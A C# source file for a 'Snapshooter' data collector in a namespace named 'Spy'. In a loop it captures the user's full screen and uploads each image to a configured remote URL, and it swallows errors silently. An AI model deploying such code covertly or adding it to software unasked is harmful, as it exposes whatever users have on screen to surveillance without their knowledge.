using System;
using System.Drawing;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using HIT.Common.Utils;
using HIT.Services;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Snapshooter : IDataCollector
    {
        private readonly string SessionId;
        private readonly SnapshooterSettings Settings;
        private readonly IHttpService HttpService;

        private bool isRunning = true;

        public Snapshooter(string sessionId, SnapshooterSettings settings, IHttpService httpService)
        {
            this.Settings = settings;
            this.SessionId = sessionId;
            this.HttpService = httpService;
        }

        public async Task Start()
        {
            var primaryScreenBounds = Screen.PrimaryScreen.Bounds;
            var primaryScreenWidth = primaryScreenBounds.Width;
            var primaryScreenHeight = primaryScreenBounds.Height;
            var destinationX = 0;
            var destinationY = 0;

            using (var bitmapScreenCapture = new Bitmap(primaryScreenWidth, primaryScreenHeight))
            {
                using (var graphics = Graphics.FromImage(bitmapScreenCapture))
                {
                    while (this.isRunning)
                    {
                        graphics.CopyFromScreen(
                            primaryScreenBounds.X,
                            primaryScreenBounds.Y,
                            destinationX,
                            destinationY,
                            bitmapScreenCapture.Size,
                            CopyPixelOperation.SourceCopy);

                        var imageAsByteArray = ConvertionOperations.ImageToByteArray(bitmapScreenCapture);

                        try
                        {
                            var model = new SnapshotViewModel
                            {
                                SessionId = this.SessionId,
                                SnapshotAsByteArray = imageAsByteArray
                            };

                            await this.HttpService.SendAsBson(model, this.Settings.RequestUrl);
                        }
                        catch (Exception exc)
                        {
                            // TODO: Log the exception cause
                        }

                        Thread.Sleep(this.Settings.SnapshotDelayInMilliseconds);
                    }
                }
            }
        }

        public void Stop()
        {
            this.isRunning = false;
        }
    }
}
